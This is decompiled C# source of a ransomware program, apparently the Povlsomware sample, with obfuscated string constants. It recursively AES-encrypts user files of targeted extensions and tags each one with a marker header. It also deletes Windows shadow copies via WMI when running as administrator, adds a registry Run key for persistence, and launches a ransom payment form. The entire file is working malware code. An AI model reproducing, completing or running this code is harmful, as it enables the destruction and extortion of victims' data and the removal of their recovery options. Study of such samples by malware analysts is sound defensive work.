using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using Povlsomware;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string file;

		internal bool method_0(string string_0)
		{
			return file.EndsWith(string_0, StringComparison.OrdinalIgnoreCase);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class2
	{
		public static readonly Class2 _003C_003E9 = new Class2();

		public static Func<string, bool> _003C_003E9__17_0;

		internal bool method_0(string string_0)
		{
			Class1 CS_0024_003C_003E8__locals0 = new Class1
			{
				file = string_0
			};
			return Class0.string_0.Any((string string_0) => CS_0024_003C_003E8__locals0.file.EndsWith(string_0, StringComparison.OrdinalIgnoreCase));
		}
	}

	private const int int_0 = 0;

	private const int int_1 = 5;

	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] char_0 = new char[1] { (char)Class5.sbyte_7 };

	private static readonly string[] string_0;

	[DllImport("User32")]
	private static extern int ShowWindow(int int_2, int int_3);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool bool_0);

	[STAThread]
	public static char[] GetPass()
	{
		return char_0;
	}

	private static void Main()
	{
		Attack();
		DestroyCopy();
		smethod_0();
		smethod_1();
	}

	private static void smethod_0()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Class5.w2, writable: true);
		if (registryKey.GetValue(Class5.x2) == null && !Application.get_ExecutablePath().Contains(Class5.y2))
		{
			registryKey.SetValue(Class5.z2, Class5.A2 + Application.get_ExecutablePath() + Class5.B2);
		}
	}

	private static void smethod_1()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new PayM3());
	}

	public static void DecryptFile(string string_1, string string_2)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Decrypt(File.ReadAllBytes(string_1).Skip(4).ToArray(), bytes);
		FileStream fileStream = File.Open(string_1, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(string_1, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine(Class5.C2 + string_1);
	}

	public static void DestroyCopy()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			flag = new WindowsPrincipal(ntIdentity).IsInRole((WindowsBuiltInRole)Class5.D2);
		}
		if (!flag)
		{
			return;
		}
		ManagementClass val = new ManagementClass(string.Concat(Class5.E2, str2: Class5.F2, str1: Class5.G2));
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					((ManagementObject)enumerator.get_Current()).Delete();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine(Class5.H2 + ex.Message);
		}
	}

	public static void EncryptFile(string string_1)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(char_0);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Encrypt(File.ReadAllBytes(string_1), bytes);
		FileStream fileStream = File.Open(string_1, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(string_1, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes(Class5.I2);
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine(Class5.J2 + string_1);
			count++;
			encryptedFiles.Add(string_1);
		}
	}

	public static void Attack()
	{
		ProcessDirectory(Class5.K2, 1, Class5.L2);
		ProcessDirectory(Class5.M2, 1, Class5.N2);
	}

	public static void UndoAttack(string string_1)
	{
		ProcessDirectory(Class5.O2, 0, string_1);
		ProcessDirectory(Class5.P2, 0, string_1);
	}

	public static void ProcessDirectory(string string_1, int int_2, string string_2)
	{
		foreach (string item in from string_0 in Directory.EnumerateFiles(string_1, Class5.Q2)
			where Class0.string_0.Any((string string_0) => string_0.EndsWith(string_0, StringComparison.OrdinalIgnoreCase))
			select string_0)
		{
			ProcessFile(item, int_2, string_2);
		}
		string[] directories = Directory.GetDirectories(string_1);
		foreach (string text in directories)
		{
			try
			{
				if (!text.Contains(Class5.R2) && !text.Contains(Class5.S2) && !text.Contains(Class5.T2) && !text.Contains(Class5.U2) && !text.Contains(Class5.V2) && !text.Contains(Class5.W2) && !text.Contains(Class5.X2) && !text.Contains(Class5.Y2) && !text.Contains(Class5.Z2) && !text.Contains(Class5.string_11))
				{
					ProcessDirectory(text, int_2, string_2);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string string_1)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(Class5.string_12);
		byte[] second = File.ReadAllBytes(string_1).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(string_1);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string string_1, int int_2, string string_2)
	{
		if (int_2 == 1 && !IsMarked(string_1))
		{
			try
			{
				EncryptFile(string_1);
				return;
			}
			catch
			{
				return;
			}
		}
		if (int_2 == 0 && IsMarked(string_1))
		{
			try
			{
				DecryptFile(string_1, string_2);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 7, 8, 2, 1, 0, 4, 6, 2 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = Class5.int_8;
		rijndaelManaged.BlockSize = Class5.int_9;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, Class5.int_10);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] AES_Decrypt(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 7, 8, 2, 1, 0, 4, 6, 2 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = Class5.int_11;
		rijndaelManaged.BlockSize = Class5.int_12;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, salt, Class5.int_13);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(byte_0, 0, byte_0.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	static Class0()
	{
		string[] array = new string[Class5.sbyte_8];
		array[0] = Class5.a3;
		array[1] = Class5.b3;
		array[2] = Class5.c3;
		array[3] = Class5.d3;
		array[4] = Class5.e3;
		array[5] = Class5.f3;
		array[6] = Class5.g3;
		array[7] = Class5.h3;
		array[8] = Class5.i3;
		array[Class5.j3] = Class5.k3;
		array[Class5.l3] = Class5.m3;
		array[Class5.n3] = Class5.o3;
		array[Class5.p3] = Class5.q3;
		array[Class5.r3] = Class5.s3;
		array[Class5.t3] = Class5.u3;
		array[Class5.v3] = Class5.w3;
		array[Class5.x3] = Class5.y3;
		array[Class5.z3] = Class5.A3;
		array[Class5.B3] = Class5.C3;
		array[Class5.D3] = Class5.E3;
		array[Class5.F3] = Class5.G3;
		array[Class5.H3] = Class5.I3;
		array[Class5.J3] = Class5.K3;
		array[Class5.L3] = Class5.M3;
		array[Class5.N3] = Class5.O3;
		array[Class5.P3] = Class5.Q3;
		array[Class5.R3] = Class5.S3;
		array[Class5.T3] = Class5.U3;
		array[Class5.V3] = Class5.W3;
		array[Class5.X3] = Class5.Y3;
		array[Class5.Z3] = Class5.string_13;
		array[Class5.sbyte_9] = Class5.string_14;
		array[Class5.sbyte_10] = Class5.string_15;
		array[Class5.sbyte_11] = Class5.string_16;
		array[Class5.sbyte_12] = Class5.string_17;
		array[Class5.sbyte_13] = Class5.a4;
		array[Class5.b4] = Class5.c4;
		array[Class5.d4] = Class5.e4;
		array[Class5.f4] = Class5.g4;
		array[Class5.h4] = Class5.i4;
		array[Class5.j4] = Class5.k4;
		array[Class5.l4] = Class5.m4;
		array[Class5.n4] = Class5.o4;
		array[Class5.p4] = Class5.q4;
		array[Class5.r4] = Class5.s4;
		array[Class5.t4] = Class5.u4;
		array[Class5.v4] = Class5.w4;
		array[Class5.x4] = Class5.y4;
		array[Class5.z4] = Class5.A4;
		array[Class5.B4] = Class5.C4;
		array[Class5.D4] = Class5.E4;
		array[Class5.F4] = Class5.G4;
		array[Class5.H4] = Class5.I4;
		array[Class5.J4] = Class5.K4;
		array[Class5.L4] = Class5.M4;
		array[Class5.N4] = Class5.O4;
		array[Class5.P4] = Class5.Q4;
		array[Class5.R4] = Class5.S4;
		array[Class5.T4] = Class5.U4;
		array[Class5.V4] = Class5.W4;
		array[Class5.X4] = Class5.Y4;
		array[Class5.Z4] = Class5.string_18;
		array[Class5.sbyte_14] = Class5.string_19;
		array[Class5.sbyte_15] = Class5.string_20;
		array[Class5.sbyte_16] = Class5.string_21;
		array[Class5.sbyte_17] = Class5.string_22;
		array[Class5.sbyte_18] = Class5.a5;
		array[Class5.b5] = Class5.c5;
		array[Class5.d5] = Class5.e5;
		array[Class5.f5] = Class5.g5;
		array[Class5.h5] = Class5.i5;
		array[Class5.j5] = Class5.k5;
		array[Class5.l5] = Class5.m5;
		array[Class5.n5] = Class5.o5;
		array[Class5.p5] = Class5.q5;
		array[Class5.r5] = Class5.s5;
		array[Class5.t5] = Class5.u5;
		array[Class5.v5] = Class5.w5;
		array[Class5.x5] = Class5.y5;
		array[Class5.z5] = Class5.A5;
		array[Class5.B5] = Class5.C5;
		array[Class5.D5] = Class5.E5;
		array[Class5.F5] = Class5.G5;
		array[Class5.H5] = Class5.I5;
		array[Class5.J5] = Class5.K5;
		array[Class5.L5] = Class5.M5;
		array[Class5.N5] = Class5.O5;
		array[Class5.P5] = Class5.Q5;
		array[Class5.R5] = Class5.S5;
		array[Class5.T5] = Class5.U5;
		array[Class5.V5] = Class5.W5;
		array[Class5.X5] = Class5.Y5;
		array[Class5.Z5] = Class5.string_23;
		array[Class5.sbyte_19] = Class5.string_24;
		array[Class5.sbyte_20] = Class5.string_25;
		array[Class5.sbyte_21] = Class5.string_26;
		array[Class5.sbyte_22] = Class5.string_27;
		array[Class5.sbyte_23] = Class5.a6;
		array[Class5.b6] = Class5.c6;
		array[Class5.d6] = Class5.e6;
		array[Class5.f6] = Class5.g6;
		array[Class5.h6] = Class5.i6;
		string_0 = array;
	}
}
